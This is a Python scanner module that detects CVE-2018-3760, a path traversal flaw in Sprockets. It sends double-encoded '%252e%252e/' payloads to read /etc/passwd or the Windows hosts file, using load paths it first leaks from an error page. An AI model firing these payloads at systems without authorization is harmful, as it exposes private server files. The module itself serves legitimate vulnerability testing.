#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check
import re

cve_2018_3760_payloads = [
    {
        'path-1': 'assets/file:%2f%2f/etc/passwd',
        'path-2': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
    },
    {
        'path-1': 'assets/file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
        'path-2': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
    },
    {
        'path-1': 'file:%2f%2f/etc/passwd',
        'path-2': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
    },
    {
        'path-1': 'file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
        'path-2': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
    },
]

def cve_2018_3760_scan(self, clients):
    ''' 在开发环境中使用 Sprockets 作为静态文件服务器
        Sprockets 3.7.1及更低版本存在二次解码导致的路径遍历漏洞, 攻击者可以使用%252e%252e/访问根目录并读取或执行目标服务器上的任何文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'File-Read',
        'vul_id': 'CVE-2018-3760',
    }

    for payload in cve_2018_3760_payloads:
        # todo 1/ 第一个请求, 寻找 RoR的load路径, 根据路径尝试FileRead漏洞
        path_1 = payload['path-1']

        res1 = client.request(
            'get',
            path_1,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        load_path_re = r'<h2>.* is no longer under a load path: .*/.{0,30}</h2>'
        load_path_search = re.search(load_path_re, res1.text, re.I|re.M|re.U|re.S)
        
        if load_path_search:
            load_path_s = load_path_search.group(0).lstrip('<h2>').rstrip('</h2>')
            load_path_s = load_path_s.replace('/etc/passwd is no longer under a load path: ', '')
            load_path_s = load_path_s.replace('C:/Windows/System32/drivers/etc/hosts is no longer under a load path: ', '')
            load_path_list = load_path_s.split(', ')

            for load_path in load_path_list:
                path_2 = payload['path-2'].format(load_path)

                res2 = client.request(
                    'get',
                    path_2,
                    allow_redirects=False,
                    vul_info=vul_info
                )
                if res2 is None:
                    continue

                if (check.check_res_fileread(res2.text)):
                    results = {
                        'Target': res2.request.url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Request': res2
                    }
                    return results
    return None
